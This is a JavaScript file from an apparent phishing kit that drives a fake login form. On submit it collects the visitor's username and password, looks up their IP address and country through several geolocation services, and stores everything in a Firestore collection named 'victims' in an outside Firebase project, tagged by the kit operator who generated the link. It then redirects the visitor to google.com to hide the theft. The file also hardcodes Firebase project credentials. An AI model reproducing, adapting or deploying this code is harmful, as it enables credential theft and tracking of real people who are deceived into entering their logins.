// ============================================================
// ⚙  FIREBASE CONFIG — Same config as dashboard.html
// ============================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {
  getFirestore, collection, addDoc, serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAbJ-KqDDA9B9wITQpi25XPndCGgT4qmyU",
  authDomain: "mrvoid-kit.firebaseapp.com",
  projectId: "mrvoid-kit",
  storageBucket: "mrvoid-kit.firebasestorage.app",
  messagingSenderId: "819971579036",
  appId: "1:819971579036:web:13a8c9664b8be10435e159",
  measurementId: "G-R9GG8W5336"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Redirect URL after successful login (change this to your desired destination)
const REDIRECT_URL = "https://www.google.com";

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const submitBtn = document.querySelector('#loginForm button[type="submit"]');
  const originalBtnText = submitBtn.textContent;
  
  // Disable button and show loading state
  submitBtn.disabled = true;
  submitBtn.textContent = 'PROCESSING...';

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;

  console.log('Form submitted with username:', username);

  // Get IP address and country using multiple fallback methods
  let ipAddress = 'Unknown';
  let country = 'Unknown';

  // Method 1: Try ip-api.com (most reliable free option, no rate limit for non-HTTPS)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const ipResponse = await fetch('http://ip-api.com/json/?fields=query,countryCode,country,regionName,city', {
      signal: controller.signal,
      mode: 'no-cors' // Some browsers block this, but worth trying
    });
    clearTimeout(timeoutId);

    if (ipResponse.ok) {
      const ipData = await ipResponse.json();
      ipAddress = ipData.query || 'Unknown';
      country = ipData.countryCode || ipData.country || 'Unknown';
      console.log('IP Data (method 1 - ip-api):', ipAddress, country);
    }
  } catch (err) {
    console.warn('Method 1 (ip-api) failed:', err.message);
  }

  // Method 2: Try ipapi.co (HTTPS supported, 1000 requests/day free)
  if (ipAddress === 'Unknown') {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);

      const ipResponse = await fetch('https://ipapi.co/json/', {
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || 'Unknown';
        country = ipData.country_code || 'Unknown';
        console.log('IP Data (method 2 - ipapi.co):', ipAddress, country);
      }
    } catch (err) {
      console.warn('Method 2 (ipapi.co) failed:', err.message);
    }
  }

  // Method 3: Try ipwho.is (free, no rate limit)
  if (ipAddress === 'Unknown') {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);

      const ipResponse = await fetch('https://ipwho.is/', {
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || 'Unknown';
        country = ipData.country_code || 'Unknown';
        console.log('IP Data (method 3 - ipwho.is):', ipAddress, country);
      }
    } catch (err) {
      console.warn('Method 3 (ipwho.is) failed:', err.message);
    }
  }

  // Method 4: Fallback to ipify for IP only (no country)
  if (ipAddress === 'Unknown') {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);

      const response = await fetch('https://api.ipify.org?format=json', {
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (response.ok) {
        const data = await response.json();
        ipAddress = data.ip || 'Unknown';
        country = 'Unknown'; // No country data from this service
        console.log('IP Data (method 4 - ipify):', ipAddress, country);
      }
    } catch (err) {
      console.warn('Method 4 (ipify) failed:', err.message);
    }
  }

  console.log('Final IP:', ipAddress, '| Country:', country);

  // Get the owner UID from the server (who generated the ngrok link)
  let ownerUid = null;
  try {
    const ownerResp = await fetch('/api/ngrok/owner');
    if (ownerResp.ok) {
      const ownerData = await ownerResp.json();
      ownerUid = ownerData.ownerUid;
    }
  } catch (err) {
    console.warn('Could not fetch owner UID:', err.message);
  }

  // Get current date and time
  const now = new Date();
  const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
  const timeStr = now.toISOString().split('T')[1].slice(0, 8); // HH:MM:SS

  console.log('Date:', dateStr, 'Time:', timeStr);

  // Determine if username is an email or a plain username
  let email = '';
  let extractedUsername = username;
  if (username && username.includes('@')) {
    email = username;
    extractedUsername = username.split('@')[0];
  }

  console.log('Username:', extractedUsername, '| Email:', email || '(not an email)');

  // Store in Firebase
  try {
    console.log('Attempting to write to Firebase Firestore...');
    console.log('Project ID:', firebaseConfig.projectId);

    const docRef = await addDoc(collection(db, 'victims'), {
      email: email,
      username: extractedUsername,
      password: password,
      ip: ipAddress,
      country: country,
      date: now.toISOString(),
      time: timeStr,
      ownerUid: ownerUid, // Who generated the link
      createdAt: serverTimestamp()
    });

    console.log('✅ Document written with ID: ', docRef.id);
    console.log('✅ Credentials captured and sent to Firebase successfully!');

    // Small delay to ensure data is written before redirect
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 500);
  } catch (error) {
    console.error('❌ Error sending to Firebase:', error.code, error.message);
    console.error('Full error:', error);

    // Show alert to user about the error (for debugging)
    alert('Login processing... (Data capture: ' + error.code + ')');

    // Still redirect even if Firebase fails
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 300);
  }
});